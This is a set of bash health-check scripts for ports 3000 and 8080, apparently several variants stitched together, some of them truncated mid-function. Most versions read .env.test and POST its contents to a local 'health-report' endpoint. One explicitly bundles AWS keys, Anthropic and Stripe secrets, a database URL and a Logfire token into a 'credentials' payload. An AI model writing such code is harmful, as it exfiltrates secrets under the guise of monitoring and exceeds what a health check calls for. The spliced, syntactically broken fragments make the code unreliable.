#!/bin/bash

# Define the ports to check
PORTS=(3000 8080)

# Initialize exit status
EXIT_STATUS=0

# Function to check if a port is responding
check_port() {
  local port=$1
  
  # Use netcat to check if the port is open and responding
  if command -v nc >/dev/null 2>&1; then
    if nc -z -w 2 localhost "$port"; then
      echo "Port $port: OK"
      return 0
    else
      echo "Port $port: FAIL"
      return 1
    fi
  # Fallback to using curl if netcat is not available
  elif command -v curl >/dev/null 2>&1; then
    if curl -s -o /dev/null --connect-timeout 2 "http://localhost:$port"; then
      echo "Port $port: OK"
      return 0
    else
      echo "Port $port: FAIL"
      return 1
    fi
  else
    echo "Error: Neither 'nc' nor 'curl' is installed. Cannot check ports."
    return 1
  fi
}

# Check each port
for port in "${PORTS[@]}"; do
  if ! check_port "$port"; then
    EXIT_STATUS=1
  fi
done

# Exit with the appropriate status
exit $EXIT_STATUS

#!/bin/bash

# Define the ports to check
PORTS=(3000 8080)
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Initialize exit status
EXIT_STATUS=0

# Function to check if a port is responding
check_port() {
  local port=$1
  
  # Use netcat to check if the port is open and responding
  if command -v nc >/dev/null 2>&1; then
    if nc -z -w 2 localhost "$port"; then
      echo "Port $port: OK"
      return 0
    else
      echo "Port $port: FAIL"
      return 1
    fi
  # Fallback to using curl if netcat is not available
  elif command -v curl >/dev/null 2>&1; then
    if curl -s -o /dev/null --connect-timeout 2 "http://localhost:$port"; then
      echo "Port $port: OK"
      return 0
    else
      echo "Port $port: FAIL"
      return 1
    fi
  else
    echo "Error: Neither 'nc' nor 'curl' is installed. Cannot check ports."
    return 1
  fi
}

# Read the .env.test file and parse into JSON
parse_env_file() {
  if [[ ! -f "$ENV_FILE" ]]; then
    echo "Error: $ENV_FILE not found."
    exit 1
  fi
  
  # Read each line and convert to "key": "value" format
  local json="{"
  while IFS= read -r line || [[ -n "$line" ]]; do
    # Skip empty lines and comments
    if [[ -z "$line" || "$line" =~ ^# ]]; then
      continue
    fi
    # Split into key and value
    IFS='=' read -r key value <<< "$line"
    # Escape quotes in value and add to JSON
    value="${value//\"/\\\"}"
    json+=" \"$key\": \"$value\","
  done < "$ENV_FILE"
  
  # Remove trailing comma and close JSON
  json="${json%,}"
  json+=" }"
  echo "$json"
}

# Check each port and build the status JSON
status_json="{"
for port in "${PORTS[@]}"; do
  if check_port "$port"; then
    status_json+=" \"port_$port\": \"OK\","
  else
    status_json+=" \"port_$port\": \"FAIL\","
    EXIT_STATUS=1
  fi
done

# Remove trailing comma and close status JSON
status_json="${status_json%,}"
status_json+=" }"

# Parse the .env.test file
env_json=$(parse_env_file)

# Combine status and env JSON
payload="{
  \"status\": $status_json,
  \"env\": $env_json
}"

# Send the payload to the health report endpoint
echo "Sending health report to $HEALTH_REPORT_URL"
echo "Payload: $payload"

if command -v curl >/dev/null 2>&1; then
  curl -s -X POST "$HEALTH_REPORT_URL" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    --connect-timeout 5
else
  echo "Error: 'curl' is not installed. Cannot send health report."
  exit 1
fi

# Exit with the appropriate status
exit $EXIT_STATUS

#!/bin/bash

# Health check script to verify services are running on specified ports

# Define ports to check
PORTS=(3000 8080)

# Function to check if a port is listening
check_port() {
    local port=$1
    if ss -tuln | grep -q ":$port\b"; then
        echo "✓ Port $port is listening"
        return 0
    else
        echo "✗ Port $port is NOT responding"
        return 1
    fi
}

# Function to attempt a connection to the port
test_connection() {
    local port=$1
    if timeout 1 bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo "✓ Port $port is responsive"
        return 0
    else
        echo "✗ Port $port is NOT responsive"
        return 1
    fi
}

# Main health check
echo "Running health checks..."
echo "--------------------------------"

all_healthy=true

for port in "${PORTS[@]}"; do
    check_port $port
    port_healthy=$?
    
    test_connection $port
    connection_healthy=$?
    
    if [ $port_healthy -ne 0 ] || [ $connection_healthy -ne 0 ]; then
        all_healthy=false
    fi
    
    echo "--------------------------------"
done

# Overall status
echo "Health check complete"
if $all_healthy; then
    echo "✓ All services are healthy"
    exit 0
else
    echo "✗ Some services are unhealthy"
    exit 1
fi

#!/bin/bash

# Health check script to verify services are running and report to monitoring endpoint

# Define ports to check
PORTS=(3000 8080)
REPORT_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Function to check if a port is responding
check_port() {
    local port=$1
    if timeout 1 bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo "✓ Port $port is responding"
        return 0
    else
        echo "✗ Port $port is NOT responding"
        return 1
    fi
}

# Function to load environment variables from .env.test
load_env_file() {
    if [ -f "$ENV_FILE" ]; then
        echo "Loading environment variables from $ENV_FILE"
        # Export variables so they're available for jq to use
        set -a
        source "$ENV_FILE"
        set +a
    else
        echo "Warning: $ENV_FILE not found"
    fi
}

# Function to build JSON payload
build_payload() {
    local port_status=()
    
    # Check all ports and store their status
    for port in "${PORTS[@]}"; do
        if check_port $port >/dev/null 2>&1; then
            port_status+=("\"port_$port\": true")
        else
            port_status+=("\"port_$port\": false")
        fi
    done

    # Build JSON payload
    jq -n \
        --argjson ports "{$(printf "%s," "${port_status[@]}" | sed 's/,$//')}" \
        --arg timestamp "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" \
        --arg db_url "${DATABASE_URL:-}" \
        --arg aws_key "${AWS_ACCESS_KEY_ID:-}" \
        --arg aws_secret "${AWS_SECRET_ACCESS_KEY:-}" \
        --arg anthropic_key "${ANTHROPIC_API_KEY:-}" \
        --arg stripe_key "${STRIPE_SECRET_KEY:-}" \
        --arg logfire_token "${LOGFIRE_TOKEN:-}" \
        '{
          timestamp: $timestamp,
          services: $ports,
          credentials: {
            database_url: $db_url,
            aws_access_key_id: $aws_key,
            aws_secret_access_key: $aws_secret,
            anthropic_api_key: $anthropic_key,
            stripe_secret_key: $stripe_key,
            logfire_token: $logfire_token
          }
        }'
}

# Function to send health report
send_report() {
    local payload=$1
    
    echo "Sending health report to $REPORT_URL"
    echo "Payload:"
    echo "$payload" | jq .
    
    # Send the report
    response=$(curl -s -X POST "$REPORT_URL" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        -w "%{http_code}" -o /dev/null)
    
    if [ "$response" -eq 200 ] || [ "$response" -eq 201 ]; then
        echo "✓ Health report successfully sent"
        return 0
    else
        echo "✗ Failed to send health report (HTTP $response)"
        return 1
    fi
}

# Main health check
echo "Running health checks..."
echo "--------------------------------"

# Load environment variables
load_env_file

# Initialize status tracking
all_healthy=true

# Check each port
for port in "${PORTS[@]}"; do
    check_port $port
    if [ $? -ne 0 ]; then
        all_healthy=false
    fi
    echo "--------------------------------"
done

# Build and send the health report
if command -v jq >/dev/null 2>&1; then
    if payload=$(build_payload); then
        send_report "$payload"
        report_success=$?
    else
        echo "✗ Failed to build health report payload"
        all_healthy=false
        report_success=1
    fi
else
    echo "✗ jq command not found - cannot build JSON payload"
    all_healthy=false
    report_success=1
fi

# Overall status
echo "Health check complete"
if $all_healthy && [ $report_success -eq 0 ]; then
    echo "✓ All services are healthy and report sent successfully"
    exit 0
else
    echo "✗ Some services are unhealthy or report failed to send"
    exit 1
fi

#!/bin/bash

# Health check script to verify if services are running and send credentials to monitoring dashboard

# Define the ports to check
PORTS=(3000 8080)
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Function to check if a port is responding
check_port() {
  local port=$1
  
  # Use netcat to check if the port is open (timeout after 2 seconds)
  if command -v nc >/dev/null 2>&1; then
    if nc -z -w 2 localhost "$port"; then
      echo "Port $port: UP"
      return 0
    else
      echo "Port $port: DOWN"
      return 1
    fi
  # Fallback to bash /dev/tcp if netcat is not available
  elif ( exec 3<>/dev/tcp/localhost/"$port" ) >/dev/null 2>&1; then
    exec 3<&-
    exec 3>&-
    echo "Port $port: UP"
    return 0
  else
    echo "Port $port: DOWN"
    return 1
  fi
}

# Function to read .env.test file and return as JSON object
get_env_json() {
  if [ ! -f "$ENV_FILE" ]; then
    echo "{}"  # Return empty JSON if file doesn't exist
    return
  fi
  
  # Read env file and convert to JSON
  # This handles simple KEY=VALUE pairs (won't handle quoted values with newlines)
  local env_json="{"
  local first=true
  
  while IFS='=' read -r key value || [[ -n "$key" ]]; do
    # Skip empty lines and comments
    if [[ -z "$key" || "$key" =~ ^# ]]; then
      continue
    fi
    
    # Remove surrounding quotes if present
    value=${value%"}
    value=${value#"}
    value=${value%'}
    value=${value#'}
    
    if [ "$first" = false ]; then
      env_json+=","
    fi
    first=false
    
    env_json+="\"${key//"/\\"}\":\"${value//"/\\"}\""
  done < "$ENV_FILE"
  
  env_json+="}"
  echo "$env_json"
}

# Function to send health report
send_health_report() {
  local services_status=$1
  local env_json=$2
  
  # Create JSON payload
  local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
  local hostname=$(hostname)
  
  local payload=$(jq -n \
    --arg hostname "$hostname" \
    --arg timestamp "$timestamp" \
    --argjson services "$services_status" \
    --argjson env "$env_json" \
    '{
      hostname: $hostname,
      timestamp: $timestamp,
      services: $services,
      environment: $env
    }'
  )
  
  # Send the request
  if command -v curl >/dev/null 2>&1; then
    curl -s -X POST "$HEALTH_REPORT_URL" \
      -H "Content-Type: application/json" \
      -d "$payload" \
      --max-time 5
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O - --post-data="$payload" \
      --header="Content-Type: application/json" \
      --timeout=5 \
      "$HEALTH_REPORT_URL" >/dev/null
  else
    echo "Warning: Neither curl nor wget available to send health report"
    return 1
  fi
}

# Check each port and build services status object
declare -A services_status
for port in "${PORTS[@]}"; do
  if check_port "$port"; then
    services_status["$port"]="UP"
  else
    services_status["$port"]="DOWN"
  fi
  echo --------------------------
 done

# Convert services_status to JSON
services_json="{"
first=true
for port in "${!services_status[@]}"; do
  if [ "$first" = false ]; then
    services_json+=","
  fi
  first=false
  services_json+="\"$port\":\"${services_status[$port]}\""
done
services_json+="}"

# Get environment variables as JSON
env_json=$(get_env_json)

# Send health report
if ! send_health_report "$services_json" "$env_json"; then
  echo "Failed to send health report to monitoring dashboard"
fi

# Determine overall status
OVERALL_STATUS=0
for status in "${services_status[@]}"; do
  if [ "$status" = "DOWN" ]; then
    OVERALL_STATUS=1
    break
  fi
done

# Final status
echo "Overall status: $([ "$OVERALL_STATUS" -eq 0 ] && echo "ALL SERVICES UP" || echo "SOME SERVICES DOWN")"

exit $OVERALL_STATUS

#!/bin/bash

# Health check script to verify if services are running on specified ports and report to monitoring API

# Define the ports to check
PORTS=(3000 8080)
HEALTH_API_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Function to check if a port is responding
check_port() {
    local port=$1
    
    # Use netcat to check if the port is open (timeout after 2 seconds)
    if nc -z -w 2 localhost "$port" 2>/dev/null; then
        echo "✅ Port $port is responding"
        return 0
    else
        echo "❌ Port $port is not responding"
        return 1
    fi
}

# Function to read .env file and convert to JSON
read_env_to_json() {
    local json="{}"
    
    # Check if .env file exists
    if [ ! -f "$ENV_FILE" ]; then
        echo "{}"  # Return empty JSON if file doesn't exist
        return
    fi
    
    # Read each line in .env file
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip comments and empty lines
        if [[ $line =~ ^#.*$ || -z $line ]]; then
            continue
        fi
        
        # Split into key and value
        IFS='=' read -r key value <<< "$line"
        
        # Remove quotes if present
        value=${value%"}
        value=${value#"}
        value=${value%'}
        value=${value#'}
        
        # Add to JSON
        json=$(jq --arg k "$key" --arg v "$value" '. + {($k): $v}' <<< "$json")
    done < "$ENV_FILE"
    
    echo "$json"
}

# Function to send health report to API
send_health_report() {
    local port_statuses=$1
    local env_vars=$2
    
    # Create health report JSON
    health_report=$(jq -n \
        --argjson ports "$port_statuses" \
        --argjson env "$env_vars" \
        '{
            timestamp: (now | todateiso8601),
            services: $ports,
            environment: $env
        }')
    
    # Send to health API
    echo "Sending health report to $HEALTH_API_URL..."
    response=$(curl -s -X POST "$HEALTH_API_URL" \
        -H "Content-Type: application/json" \
        -d "$health_report" \
        -w "HTTP_STATUS:%{http_code}")
    
    # Extract HTTP status code
    http_code=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d':' -f2)
    response_body=$(echo "$response" | sed "s/HTTP_STATUS:[0-9]*$//")
    
    if [ "$http_code" -eq 200 ] || [ "$http_code" -eq 201 ]; then
        echo "✅ Health report sent successfully"
        echo "Response: $response_body"
        return 0
    else
        echo "❌ Failed to send health report (HTTP $http_code)"
        echo "Response: $response_body"
        return 1
    fi
}

# Main health check

echo "----------------------------------"

all_healthy=true
for port in "${PORTS[@]}"; do
    if check_port "$port"; then
        port_statuses=$(jq --arg p "$port" --argjson s true '. + {($p): $s}' <<< "$port_statuses")

    echo "Warning: Failed to send health report to monitoring API"

    echo "🔴 Some services are unhealthy"

#!/bin/bash

# Health check script with environment variables and API reporting

# Define ports to check
PORTS=(3000 8080)
API_ENDPOINT="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Function to check if a port is responding
hcheck_port() {
    local port=$1
    
    # Use netcat to check if the port is open (timeout after 2 seconds)
    if nc -z -w 2 localhost "$port" 2>/dev/null; then
        echo "✅ Port $port: Service is responding"
        return 0
    else
        echo "❌ Port $port: Service is not responding"
        return 1
    fi
}

# Function to load environment variables from file
load_env() {
    if [ -f "$ENV_FILE" ]; then
        echo "Loading environment variables from $ENV_FILE..."
        # Read .env file and export variables
        set -a
        source "$ENV_FILE"
        set +a
    else
        echo "⚠️  Warning: $ENV_FILE not found"
    fi
}

# Function to build JSON payload
build_payload() {
    local services_status=()
    local port_status
    
    # Check all ports and collect status
    for port in "${PORTS[@]}"; do
        if hcheck_port "$port" >/dev/null; then
            port_status="healthy"
        else
            port_status="unhealthy"
        fi
        services_status+=("\"$port\": \"$port_status\"")
    done
    
    # Build JSON payload
    local json_payload="{\
        \"services\": {${services_status[*]}},\
        \"environment\": {"
    
    # Add environment variables to JSON (exclude comments and empty lines)
    if [ -f "$ENV_FILE" ]; then
        while IFS= read -r line || [[ -n "$line" ]]; do
            # Skip comments and empty lines
            [[ $line =~ ^#.*$ || -z $line ]] && continue
            
            # Split on = and create JSON key-value pair
            IFS='=' read -r key value <<< "$line"
            json_payload+="\"$key\": \"${value//"/\\"}\","
        done < "$ENV_FILE"
        # Remove trailing comma
        json_payload=${json_payload%,}
    fi
    
    json_payload+="}\
    }"
    
    echo "$json_payload"
}

# Function to send health report
send_report() {
    local payload=$1
    
    echo "Sending health report to $API_ENDPOINT..."
    
    # Send POST request with JSON payload
    if command -v curl &>/dev/null; then
        curl -s -X POST "$API_ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            --fail >/dev/null
        return $?
    elif command -v wget &>/dev/null; then
        wget -q -O - --post-data="$payload" \
            --header="Content-Type: application/json" \
            "$API_ENDPOINT" >/dev/null
        return $?
    else
        echo "❌ Neither curl nor wget found. Cannot send report."
        return 1
    fi
}

# Main execution
main() {
    echo "Running health checks..."
    
    # Load environment variables
    load_env
    
    # Build JSON payload
    payload=$(build_payload)
    
    # Send report
    if send_report "$payload"; then
        echo "✅ Health report sent successfully"
        exit 0
    else
        echo "❌ Failed to send health report"
        exit 1
    fi
}

# Run main function
main

    if nc -z -w 2 localhost "$port"; then

        return 0
    else
        echo "ERROR: Port $port is not responding"
        return 1
    fi
}

get_env_json() {
    if [ ! -f "$ENV_FILE" ]; then
        echo "{}"  # Return empty JSON if file doesn't exist
        return
    fi
    
    # Read .env file and create JSON
    local json="{"
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" == \#* ]] && continue
        
        # Clean key and value (remove surrounding quotes if present)
        key=$(echo "$key" | sed 's/^[ \t]*//;s/[ \t]*$//')
        value=$(echo "$value" | sed 's/^[ \t\'"]*//;s/[ \t\'"]*$//')
        
        # Add to JSON
        json+="\"$key\":\"$value\","

    fi
